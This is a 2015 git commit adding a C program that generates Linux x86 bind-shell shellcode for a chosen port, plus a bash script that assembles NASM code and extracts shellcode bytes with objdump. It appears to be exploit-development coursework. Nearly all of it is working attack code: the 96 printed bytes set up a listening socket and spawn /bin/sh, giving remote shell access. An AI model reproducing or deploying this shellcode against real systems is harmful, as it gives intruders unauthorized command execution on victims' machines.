c1bd55232c24100ebf7915b67661eab323e06363
Re4son <re4son@whitedome.com.au>
2015-06-12 11:06:15 +1000

    Release 1.0

---
+++ make-bindshell.c
@@ -0,0 +1,55 @@
+/******************************************************************
+*    make-bindshell -- Program to generate bind shellcode
+* 
+*    Author   : Re4son re4son [ at ] whitedome.com.au
+*    Purpose  : generates bind shell code with port given as argument
+*    Usage    : make-bindshell <port>
+******************************************************************/
+
+
+#include <stdio.h>
+#include <string.h>
+
+int main( int argc, char *argv[] )
+{
+    unsigned int port;
+    char low,high;
+    char cmdArg[6];
+    int i;
+
+    if (argc > 1 && strlen(argv[1]) <=5){
+        strcpy(cmdArg, argv[1]);
+
+        // Make sure that the argument contains nothing but digits
+        for (i = 0; i < strlen(cmdArg); i++){
+            if (!isdigit(cmdArg[i])){
+                printf("Port must be a number\n");
+		printf("Usage: %s <port>\n", argv[0] );
+                return 1;
+            }
+         }
+
+      // Convert argument from C string to integer
+      port = atoi(cmdArg);
+      high = port >> 8;
+      low = (port << 8) >> 8;
+      } else {
+
+	printf("Usage: %s <port>\n", argv[0] );
+	return 1;
+    }
+
+    printf(  "Shellcode length : 96 bytes\n"
+	     "Bind port (%05d): \\x%02x\\x%02x (Check for bad chars)\n\n"
+
+	     "\"\\x31\\xdb\\xf7\\xe3\\xb3\\x01\\x6a\\x06\\x53\\x6a\\x02\\x89\\xe1\\xb0\"\n"
+	     "\"\\x66\\x89\\xc7\\xcd\\x80\\x96\\x43\\x52\\x66\\x68\\x%02x\\x%02x\\x66\\x53\"\n"
+	     "\"\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x89\\xf8\\xcd\\x80\\x52\\x56\"\n"
+	     "\"\\xb3\\x04\\x89\\xe1\\x89\\xf8\\xcd\\x80\\x52\\x52\\x56\\x43\\x89\\xe1\"\n"
+	     "\"\\x97\\xcd\\x80\\x93\\x31\\xc9\\xb1\\x02\\xb0\\x3f\\xcd\\x80\\x49\\x79\"\n"
+	     "\"\\xf9\\x92\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n"
+	     "\"\\xe3\\x50\\x53\\x89\\xe1\\x50\\x89\\xe2\\xb0\\x0b\\xcd\\x80\";\n\n", port, high, low, high, low);
+
+    return 0;
+
+}
---
+++ shell-compile.sh
@@ -0,0 +1,47 @@
+#!/bin/bash
+##################################################################
+## Name:	compile.sh                                      ##
+## Purpose:	assembles and links nasm source into executable ##
+##              then executes objdump to generate and print out ##
+##              shellcode and it's length.                      ##
+## Author:	re4son [at] whitedome.com.au                    ##
+##################################################################
+
+
+PROGRAM=$1
+EXT="${PROGRAM##*.}"
+
+
+if [ $EXT == "nasm" ]
+    then
+	PROGRAM="${PROGRAM%.*}"
+    else
+	PROGRAM=$1
+fi
+
+## if [ ! -f $PROGRAM ]
+##    then
+##	echo "[!] Cannot find $PROGRAM.nasm"
+##	echo "[-] Exiting"
+##	exit
+##fi
+
+echo
+echo "[+] Assembling $PROGRAM.nasm with \"nasm -f elf32 -o $PROGRAM.o $PROGRAM.nasm\" "
+nasm -f elf32 -o $PROGRAM.o $PROGRAM.nasm
+
+# Link with the -N argument (omagic) to not make text section read-only
+echo "[+] Linking $PROGRAM.o with \"ld -N -o $PROGRAM $PROGRAM.o\""
+ld -N -o $PROGRAM $PROGRAM.o
+
+
+echo '[+] Generating shellcode via objdump and sed ...'
+SHELLCODE=$(objdump -d ./$PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
+
+# Get the shellcode size in bytes (\xyy = 1byte):
+size=$((((${#SHELLCODE})-2)/4))
+
+echo "[+] $size bytes shellcode generated:"
+echo
+echo "$SHELLCODE"
+echo
